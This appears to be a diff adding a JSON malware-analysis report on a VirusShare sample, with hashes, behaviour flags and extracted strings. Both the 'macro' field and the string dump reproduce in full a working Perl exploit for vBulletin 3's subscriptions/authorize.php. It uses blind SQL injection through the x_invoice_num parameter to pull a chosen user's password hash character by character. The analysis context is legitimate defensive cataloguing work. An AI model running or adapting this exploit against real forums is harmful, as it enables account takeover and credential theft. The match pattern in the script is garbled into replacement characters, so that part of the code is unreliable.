@@ -1,0 +1,95 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "Hex Strings": "Hex-encoded str were detected, may be used to obfuscate str",
+            "chr": "May attempt to obfuscate specific str"
+        },
+        "macro": "#use strict; \nuse LWP;\nuse HTTP::Request::Common; \n\n\nprint \"\\n           #####################################################\\n\";\nprint \"                       Exploit of VBB3's authorize.php\\n\";\nprint \"                            Codz By Jambalaya       \\n\";\nprint \"\t\t\t website: www.itaq.org              \\n\";\nprint \"            Give my best wishs to Bytes and his girlfriend--luze \\n\";\nprint \"           #####################################################\\n\\n\";\n\n&usage;\n\n\nprint \"\\nplease input the url you wannt attack:\\n\";\n\n$url=<>;\nchomp($url);\n#print $url;\n\n\n#$url = 'http://192.168.0.13/myhome/newvbb/subscriptions/authorize.php'; \n#$id=1;\n\n\nprint \"input the userid you wanna attack:\\n\";\n$id=<>;\nchomp($id);\n#print $id;\n\n\nmy $agent = LWP::UserAgent->new; \n\n@jam1=(48..57);\n@jam2=(97..102);\n@jam=(@jam1,@jam2);\n\n\nprint \"\\nAttacking>>>\\n\";\nprint \"please wait,I need time!!>>>>>>\\n\\n\";\n\n\nfor($i=1;$i<=32;$i++)\n{\n\tfor ($j=0;$j<=@jam;$j++) \n\t\t{\n\t\t\t\n\t\t\t\n\t\t\tmy $res = $agent->post($url, {x_MD5_Hash=>'D41D8CD98F00B204E9800998ECF8427E',x_response_code=>'1',x_invoice_num=>\"1_$id and ord(substring(password, $i,1))=$jam[$j]_1\"});\n\t\t\t#$id%20and%20ord(substring(password,1,1)=57_1\"});\n\n\t\t\tif ($res->content =~ m/\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd/) \n\t\t\t{\n\t\t\t\tprint \"$i>>>\\n\"; \n\t\t\t\t$nowpass=chr($jam[$j]);\n\t\t\t\tprint \"the $i of password is $nowpass\\n\";\n\t\t\t\t$passwd.=chr($jam[$j]);\n\t\t\t}\n\n\n\t     }\n}\n\n\n\tif ($passwd eq \"\") \n\t\t{\n\t\t print \"Oh,My boy! I failed,please don't cry~~~~~\\n\";\n\t}\n\telse\n\t{\n\t\tprint \" the password of the userid=$id is $passwd\\n\\n\";\n\t\tprint \"Now! it 's your turn,isn't?      :)\\n\";\n\t}\n\nsub usage {\nprint qq~\nUsage: \n    1.for url \n\twanna attack website is http://192.168.0.13/myhome/vbb3/\\index.php\n\tinputing is http://192.168.0.13/myhome/vbb3/subscriptions/authorize.php\n    2.for userid  \n\t(I wanna attack user named Jambalaya, his userid is 1,so inputing is 1)\n    3.please make sure it is up verion 3.0\n   \n~;\n}\n\n\n\n\n"
+    },
+    "filename": "VirusShare_029d5ceb7c3ec2d2698cfc5ffc2ce8a3",
+    "filesize": 2002,
+    "filetype": "ISO-8859 text, with CRLF line terminators",
+    "hashes": {
+        "md5": "029d5ceb7c3ec2d2698cfc5ffc2ce8a3",
+        "sha1": "77576618d98185a3d4538c2b4f76fba29dba7b89",
+        "sha256": "9b6e2dd31d3b93478ee1d0898f1d972eeb0c5a156e95c115932661ef6e5931dc"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "#use strict; ",
+            "use LWP;",
+            "use HTTP::Request::Common; ",
+            "print \"\\n           #####################################################\\n\";",
+            "print \"                       Exploit of VBB3's authorize.php\\n\";",
+            "print \"                            Codz By Jambalaya       \\n\";",
+            "print \"\t\t\t website: www.itaq.org              \\n\";",
+            "print \"            Give my best wishs to Bytes and his girlfriend--luze \\n\";",
+            "print \"           #####################################################\\n\\n\";",
+            "&usage;",
+            "print \"\\nplease input the url you wannt attack:\\n\";",
+            "$url=<>;",
+            "chomp($url);",
+            "#print $url;",
+            "#$url = 'http://192.168.0.13/myhome/newvbb/subscriptions/authorize.php'; ",
+            "#$id=1;",
+            "print \"input the userid you wanna attack:\\n\";",
+            "$id=<>;",
+            "chomp($id);",
+            "#print $id;",
+            "my $agent = LWP::UserAgent->new; ",
+            "@jam1=(48..57);",
+            "@jam2=(97..102);",
+            "@jam=(@jam1,@jam2);",
+            "print \"\\nAttacking>>>\\n\";",
+            "print \"please wait,I need time!!>>>>>>\\n\\n\";",
+            "for($i=1;$i<=32;$i++)",
+            "\tfor ($j=0;$j<=@jam;$j++) ",
+            "\t\t\tmy $res = $agent->post($url, {x_MD5_Hash=>'D41D8CD98F00B204E9800998ECF8427E',x_response_code=>'1',x_invoice_num=>\"1_$id and ord(substring(password, $i,1))=$jam[$j]_1\"});",
+            "\t\t\t#$id%20and%20ord(substring(password,1,1)=57_1\"});",
+            "\t\t\tif ($res->content =~ m//) ",
+            "\t\t\t{",
+            "\t\t\t\tprint \"$i>>>\\n\"; ",
+            "\t\t\t\t$nowpass=chr($jam[$j]);",
+            "\t\t\t\tprint \"the $i of password is $nowpass\\n\";",
+            "\t\t\t\t$passwd.=chr($jam[$j]);",
+            "\t\t\t}",
+            "\t     }",
+            "\tif ($passwd eq \"\") ",
+            "\t\t print \"Oh,My boy! I failed,please don't cry~~~~~\\n\";",
+            "\telse",
+            "\t\tprint \" the password of the userid=$id is $passwd\\n\\n\";",
+            "\t\tprint \"Now! it 's your turn,isn't?      :)\\n\";",
+            "sub usage {",
+            "print qq~",
+            "Usage: ",
+            "    1.for url ",
+            "\twanna attack website is http://192.168.0.13/myhome/vbb3/\\index.php",
+            "\tinputing is http://192.168.0.13/myhome/vbb3/subscriptions/authorize.php",
+            "    2.for userid  ",
+            "\t(I wanna attack user named Jambalaya, his userid is 1,so inputing is 1)",
+            "    3.please make sure it is up verion 3.0"
+        ],
+        "file": {
+            "\tinputing is http://192.168.0.13/myhome/vbb3/subscriptions/authorize.php": "Web Page",
+            "\twanna attack website is http://192.168.0.13/myhome/vbb3/\\index.php": "Web Page"
+        },
+        "fuzzing": {},
+        "ip": [
+            "192.168.0.13"
+        ],
+        "url": [
+            "http://192.168.0.13/myhome/vbb3/\\index.php",
+            "http://192.168.0.13/myhome/newvbb/subscriptions/authorize.php",
+            "http://192.168.0.13/myhome/vbb3/subscriptions/authorize.php"
+        ]
+    },
+    "time": "0:00:00.274640",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
